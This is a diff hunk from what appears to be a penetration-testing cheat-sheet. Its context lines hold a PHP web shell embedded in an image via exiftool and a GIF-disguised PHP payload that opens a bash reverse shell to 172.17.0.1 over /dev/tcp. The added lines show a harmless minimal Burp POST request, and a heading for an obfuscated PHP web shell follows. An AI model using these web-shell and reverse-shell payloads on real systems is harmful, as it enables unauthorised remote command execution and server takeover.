@@ -216,6 +216,21 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
 
 GIF8; <?php echo exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/80 0>&1'"); ?>
 ```
+# BURP
+Minimum POST REQUEST (needed Content-Type)
+```bash
+POST /verify HTTP/1.1
+Host: 192.168.209.117:50000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Content-Length: 8
+Content-Type: application/x-www-form-urlencoded
+
+code=123
+```
 # Simple and Obfuscate PHP Web Shell
 
 <h1>PHP Web Shell</h1>
